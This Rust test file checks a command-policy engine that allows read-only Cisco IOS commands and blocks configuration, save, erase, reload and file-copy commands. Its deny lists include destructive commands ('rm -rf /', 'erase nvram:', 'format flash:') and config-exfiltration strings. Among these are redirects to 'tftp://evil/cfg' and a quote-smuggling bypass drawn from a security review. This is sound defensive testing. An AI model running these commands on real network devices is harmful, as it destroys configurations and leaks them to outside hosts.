//! Cisco IOS dangerous- + permitted-command corpus.
//!
//! Same shape as `junos_corpus.rs`. New rows for commands hit in the
//! field belong here. When this test fails, see the failure-mode
//! comment in `junos_corpus.rs`.

use std::path::PathBuf;

use transit_core::inventory::Vendor;
use transit_policy::{Decision, PolicyEngine};

fn engine() -> PolicyEngine {
    let dir = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .join("..")
        .join("..")
        .join("..")
        .join("policies");
    PolicyEngine::load_from_dir(&dir).expect("policies/ loads cleanly")
}

#[derive(Debug)]
enum Expect {
    Allow,
    Deny,
}

fn assert_corpus(rows: &[(&str, Expect)]) {
    let engine = engine();
    let mut failures: Vec<String> = Vec::new();
    for (cmd, expect) in rows {
        let got = engine.evaluate(&Vendor::CiscoIos, cmd);
        let ok = matches!(
            (expect, &got),
            (Expect::Allow, Decision::Allow) | (Expect::Deny, Decision::Deny { .. })
        );
        if !ok {
            failures.push(format!("  {:?} on {cmd:?} -> {got:?}", expect));
        }
    }
    if !failures.is_empty() {
        panic!(
            "corpus mismatches ({} of {}):\n{}",
            failures.len(),
            rows.len(),
            failures.join("\n")
        );
    }
}

#[test]
fn cisco_ios_allowed_corpus() {
    assert_corpus(&[
        // Operational status workhorses.
        ("show version", Expect::Allow),
        ("SHOW VERSION", Expect::Allow), // case-folded (D-4)
        ("show running-config", Expect::Allow),
        ("show startup-config", Expect::Allow),
        ("show ip interface brief", Expect::Allow),
        ("show ip route", Expect::Allow),
        ("show ip bgp summary", Expect::Allow),
        ("show ip ospf neighbor", Expect::Allow),
        ("show interfaces", Expect::Allow),
        ("show interfaces status", Expect::Allow),
        ("show vlan brief", Expect::Allow),
        ("show mac address-table", Expect::Allow),
        ("show cdp neighbors", Expect::Allow),
        ("show lldp neighbors", Expect::Allow),
        ("show spanning-tree", Expect::Allow),
        ("show inventory", Expect::Allow),
        ("show environment power", Expect::Allow),
        // Network probes.
        ("ping 10.0.0.1", Expect::Allow),
        ("ping ip 10.0.0.1 source GigabitEthernet0/0", Expect::Allow),
        ("traceroute 10.0.0.1", Expect::Allow),
        // Aliased forms.
        ("sh ip int brief", Expect::Allow),
        ("sho ip route", Expect::Allow),
        ("p 10.0.0.1", Expect::Allow),
        // Read-only file/storage.
        ("dir flash:", Expect::Allow),
        ("dir bootflash:", Expect::Allow),
        ("more flash:config.text", Expect::Allow),
        // Pager + monitor (read-only effects).
        ("terminal length 0", Expect::Allow),
        ("terminal monitor", Expect::Allow),
        ("terminal no monitor", Expect::Allow),
        // Pipe stages.
        ("show running-config | include hostname", Expect::Allow),
        ("show running-config | exclude !", Expect::Allow),
        ("show interfaces | begin GigabitEthernet0/0", Expect::Allow),
        ("show running-config | section interface", Expect::Allow),
        ("show ip route | include 10.0", Expect::Allow),
        ("show running-config | count", Expect::Allow),
    ]);
}

#[test]
fn cisco_ios_blocked_corpus() {
    assert_corpus(&[
        // Privileged-mode escalation.
        ("enable", Expect::Deny),
        ("enable 15", Expect::Deny),
        ("disable", Expect::Deny),
        // Configuration-mode entry.
        ("configure terminal", Expect::Deny),
        ("conf t", Expect::Deny),
        ("configure", Expect::Deny),
        // Case variants — the CLI is case-insensitive, so the gate
        // case-folds; these must hit the blocklist patterns (D-4).
        ("CONF T", Expect::Deny),
        ("CONFIGURE TERMINAL", Expect::Deny),
        // Saves.
        ("write memory", Expect::Deny),
        ("write", Expect::Deny),
        ("wr mem", Expect::Deny), // alias canonicalizes
        ("wr", Expect::Deny),
        ("wri", Expect::Deny),
        ("write erase", Expect::Deny),
        ("write terminal", Expect::Deny),
        // File mutations.
        ("copy running-config startup-config", Expect::Deny),
        ("copy tftp: flash:", Expect::Deny),
        ("copy flash:test.bin tftp:", Expect::Deny),
        ("delete flash:foo", Expect::Deny),
        ("erase startup-config", Expect::Deny),
        ("erase nvram:", Expect::Deny),
        ("format flash:", Expect::Deny),
        (
            "archive download-sw /allow-feature-upgrade tftp://...",
            Expect::Deny,
        ),
        ("boot system flash:image.bin", Expect::Deny),
        // Reload / reset / clear.
        ("reload", Expect::Deny),
        ("reload in 5", Expect::Deny),
        ("clear ip bgp *", Expect::Deny),
        ("clear arp-cache", Expect::Deny),
        ("clear counters", Expect::Deny),
        // Tcl + EEM.
        ("tclsh", Expect::Deny),
        ("tclquit", Expect::Deny),
        ("event manager run my-applet", Expect::Deny),
        // Session control.
        ("logout", Expect::Deny),
        ("exit", Expect::Deny),
        ("quit", Expect::Deny),
        ("end", Expect::Deny),
        // Default-deny: nothing matches.
        ("telnet 1.2.3.4", Expect::Deny),
        ("ssh -l user 10.0.0.1", Expect::Deny),
        ("rm -rf /", Expect::Deny),
        ("totally-novel-command", Expect::Deny),
        ("", Expect::Deny),
        // Pipe-stage abuse.
        (
            "show running-config | redirect tftp://server/cfg",
            Expect::Deny,
        ),
        ("show running-config | tee flash:cfg.txt", Expect::Deny),
        (
            "show running-config | append flash:archive.txt",
            Expect::Deny,
        ),
        // Empty pipe stage.
        ("show running-config |", Expect::Deny),
        // Unknown pipe stage.
        ("show running-config | weird-pipe", Expect::Deny),
    ]);
}

#[test]
fn cisco_ios_write_and_exfil_bypasses_are_blocked() {
    // Security review 2026-07 (findings #1/#2/#5).
    assert_corpus(&[
        // #2 — output redirection to a device file.
        ("show running-config > flash:backup.cfg", Expect::Deny),
        // #1 — blocked pipe verb hidden behind an unbalanced quote.
        (
            "show running-config | include x\" | redirect tftp://evil/cfg",
            Expect::Deny,
        ),
        // #5 — `show tech-support` to a file/URL destination.
        ("show tech-support file flash:tech.txt", Expect::Deny),
        ("show tech-support | redirect tftp://evil/t", Expect::Deny),
    ]);
}
